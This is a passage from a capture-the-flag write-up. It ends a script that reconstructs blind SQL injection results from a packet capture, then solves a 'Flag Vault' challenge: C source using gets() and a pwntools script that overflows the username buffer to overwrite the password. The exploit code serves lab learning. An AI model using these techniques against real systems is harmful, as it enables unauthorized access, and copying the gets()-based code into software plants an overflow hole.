+</span></span><span class="line"><span class="cl"><span class="n">PCAP_FILE</span> <span class="o">=</span> <span class="s2">&#34;challenge.pcapng&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TRUE_LENGTH</span> <span class="o">=</span> <span class="mi">156</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_char</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lower</span><span class="p">,</span> <span class="n">upper</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">is_true</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">is_true</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">lower</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">lower</span><span class="p">,</span> <span class="n">threshold</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">upper</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">upper</span><span class="p">,</span> <span class="n">threshold</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">lower</span> <span class="o">&gt;</span> <span class="n">upper</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;?&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">lower</span><span class="p">)</span> <span class="k">if</span> <span class="n">lower</span> <span class="o">==</span> <span class="n">upper</span> <span class="k">else</span> <span class="s2">&#34;?&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_packets</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tshark_cmd</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;tshark&#34;</span><span class="p">,</span> <span class="s2">&#34;-r&#34;</span><span class="p">,</span> <span class="n">PCAP_FILE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-Y&#34;</span><span class="p">,</span> <span class="s2">&#34;http.request || (http.response &amp;&amp; http.response.code == 200)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-T&#34;</span><span class="p">,</span> <span class="s2">&#34;fields&#34;</span><span class="p">,</span> <span class="s2">&#34;-e&#34;</span><span class="p">,</span> <span class="s2">&#34;tcp.stream&#34;</span><span class="p">,</span> <span class="s2">&#34;-e&#34;</span><span class="p">,</span> <span class="s2">&#34;http.request.full_uri&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-e&#34;</span><span class="p">,</span> <span class="s2">&#34;http.response.code&#34;</span><span class="p">,</span> <span class="s2">&#34;-e&#34;</span><span class="p">,</span> <span class="s2">&#34;http.content_length&#34;</span><span class="p">,</span> <span class="s2">&#34;-E&#34;</span><span class="p">,</span> <span class="s2">&#34;separator= &#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">tshark_cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="p">,</span> <span class="n">responses</span> <span class="o">=</span> <span class="p">{},</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">output</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">parts</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stream</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;http://&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">requests</span><span class="p">[</span><span class="n">stream</span><span class="p">]</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;200&#34;</span> <span class="ow">and</span> <span class="n">stream</span> <span class="ow">in</span> <span class="n">requests</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">responses</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">requests</span><span class="p">[</span><span class="n">stream</span><span class="p">],</span> <span class="s2">&#34;200&#34;</span><span class="p">,</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">stream</span><span class="p">,</span> <span class="n">stream</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">responses</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_field</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="n">field</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">positions</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">uri</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">content_length</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s2">&#34;CHAR_LENGTH&#34;</span> <span class="ow">in</span> <span class="n">uri</span> <span class="ow">or</span> <span class="n">field</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">uri</span> <span class="ow">or</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;LIMIT%20</span><span class="si">{</span><span class="n">row</span><span class="si">}</span><span class="s2">%2C1&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">uri</span> <span class="ow">or</span> <span class="s2">&#34;profile_db.%60profiles&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">uri</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pos_match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;</span><span class="si">%29%</span><span class="s2">2C(\d+)%2C1</span><span class="si">%29%</span><span class="s2">29</span><span class="si">%3E</span><span class="s2">(\d+)&#34;</span><span class="p">,</span> <span class="n">uri</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pos_match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pos</span><span class="p">,</span> <span class="n">threshold</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">pos_match</span><span class="o">.</span><span class="n">groups</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="n">is_true</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span> <span class="o">==</span> <span class="n">TRUE_LENGTH</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">positions</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">threshold</span><span class="p">,</span> <span class="n">is_true</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decode_char</span><span class="p">(</span><span class="n">positions</span><span class="p">[</span><span class="n">pos</span><span class="p">])</span> <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">positions</span><span class="p">)</span> <span class="k">if</span> <span class="n">positions</span><span class="p">[</span><span class="n">pos</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Parsing packets...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parsed_data</span> <span class="o">=</span> <span class="n">parse_packets</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">all_names</span><span class="p">,</span> <span class="n">all_descriptions</span> <span class="o">=</span> <span class="p">{},</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">decode_field</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">parsed_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">desc</span> <span class="o">=</span> <span class="n">decode_field</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="s2">&#34;description&#34;</span><span class="p">,</span> <span class="n">parsed_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">name</span> <span class="ow">or</span> <span class="n">desc</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">all_names</span><span class="p">[</span><span class="n">row</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">desc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">all_descriptions</span><span class="p">[</span><span class="n">row</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">desc</span>
+</span></span><span class="line"><span class="cl">        <span class="n">row</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decoded Names:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row_num</span><span class="p">,</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">all_names</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Row </span><span class="si">{</span><span class="n">row_num</span><span class="si">}</span><span class="s2">: &#39;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Decoded Descriptions:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row_num</span><span class="p">,</span> <span class="n">desc</span> <span class="ow">in</span> <span class="n">all_descriptions</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Row </span><span class="si">{</span><span class="n">row_num</span><span class="si">}</span><span class="s2">: &#39;</span><span class="si">{</span><span class="n">desc</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="/sequeldump2.png" alt="sequeldump2"></p>
+<h2 id="pwn">PWN</h2>
+<h3 id="flag-vault">Flag Vault</h3>
+<p><strong>Challenge Description:</strong><br>
+Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don&rsquo;t believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.</p>
+<h4 id="solution-5">Solution</h4>
+<p><strong>Source Code Overview</strong><br>
+The C program implements a login system to protect a flag stored in flag.txt. The key functions are <code>print_flag</code> and <code>login</code>. The source code provided is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_banner</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;  ______ _          __      __         _ _   </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; |  ____| |         </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">    / /        | | |  </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; | |__  | | __ _  __ </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">  / /_ _ _   _| | |_ </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; |  __| | |/ _` |/ _` </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">/ / _` | | | | | __|</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; | |    | | (_| | (_| |</span><span class="se">\\</span><span class="s">  / (_| | |_| | | |_ </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; | |_|    |_|</span><span class="se">\\</span><span class="s">__,_|</span><span class="se">\\</span><span class="s">__, | </span><span class="se">\\</span><span class="s">/ </span><span class="se">\\</span><span class="s">__,_|</span><span class="se">\\</span><span class="s">__,_|_|</span><span class="se">\\</span><span class="s">__|</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;                  __/ |                      </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;                 |___/                       </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;                                             </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Version 1.0 - Passwordless authentication evolved!</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;==================================================================</span><span class="se">\n\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_flag</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// If I disable the password, nobody will get in.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//printf(&#34;Password: &#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//gets(password);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">&#34;bytereaper&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">&#34;5up3rP4zz123Byte&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">print_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong password! No flag for you.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">print_banner</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">login</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Solution</strong><br>
+The code contains a classic stack-based buffer overflow vulnerability due to the use of <code>gets()</code> in the <code>login()</code> function.<br>
+The <code>gets()</code> function reads input into username until a newline, without bounds checking.<br>
+Since <code>gets()</code> doesn’t limit input length, entering more than 100 bytes overflows the <code>username</code> buffer into adjacent memory, including the <code>password</code> buffer. <br>
+The <code>password</code> buffer (char password[100]) is declared immediately before <code>username</code> in the <code>login()</code> function. In most stack layouts, this places <code>password</code> directly before username in memory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//stack layout [ password (100 bytes) ][ username (100 bytes) ]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span></span></code></pre></div><p>Overflowing the username therefore allows overwriting the password, as there’s no boundary enforcement.<br>
+The authentication in the login function check uses strcmp() to compare username with &ldquo;bytereaper&rdquo; and password with &ldquo;5up3rP4zz123Byte&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">&#34;bytereaper&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">&#34;5up3rP4zz123Byte&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">print_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>By crafting an input for <code>username</code> that overflows into <code>password</code>, both strings can be controlled. For <code>strcmp()</code> to match, the input must include null bytes (<code>\x00</code>) to terminate strings correctly, ensuring username ends after &ldquo;<code>bytereaper</code>&rdquo; and password ends after &ldquo;<code>5up3rP4zz123Byte</code>&rdquo;.<br>
+Locally, crafting a payload to exploit the stack overflow was straightforward, since we could use debug prints to check the variables <code>username</code> and <code>password</code>.<br>
+A payload like <code>&quot;bytereaper\x00[93 byte padding]5up3rP4zz123Byte\x00&quot;</code> works locally. However, on the remote server, the exploit fails initially.  <br>
+Likely due to differences in stack alignment, compiler optimizations, or memory layout (e.g., padding between variables). To solve that issue a fuzzing part was added to the local solve script to find the right padding size.
+The final solve.py used is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Establish remote connection</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;MACHINE_IP&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Wait for username prompt</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Username: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Define target strings</span>
+</span></span><span class="line"><span class="cl"><span class="n">required_username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;bytereaper&#34;</span>  <span class="c1"># 11 bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">null_byte</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>                 <span class="c1"># 1 byte to terminate username</span>
+</span></span><span class="line"><span class="cl"><span class="n">required_password</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;5up3rP4zz123Byte&#34;</span>  <span class="c1"># 17 bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Fuzz padding sizes to align buffers</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">padding_size</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">85</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>  <span class="c1"># Test padding from 85 to 115 bytes</span>
+</span></span><span class="line"><span class="cl">    <span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">padding_size</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">required_username</span> <span class="o">+</span> <span class="n">null_byte</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">required_password</span> <span class="o">+</span> <span class="n">null_byte</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Trying payload with padding size </span><span class="si">{</span><span class="n">padding_size</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Send payload</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Capture response</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Check for flag</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;THM{&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Success! Flag received:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Attempt failed, trying next size...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Reset connection for next attempt</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;MACHINE_IP&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span></code></pre></div><p>The script constructs a payload in the format:</p>
+<ul>
+<li><code>bytereaper\x00</code>: Ensures <code>strcmp(username, &quot;bytereaper&quot;)</code> passes.</li>
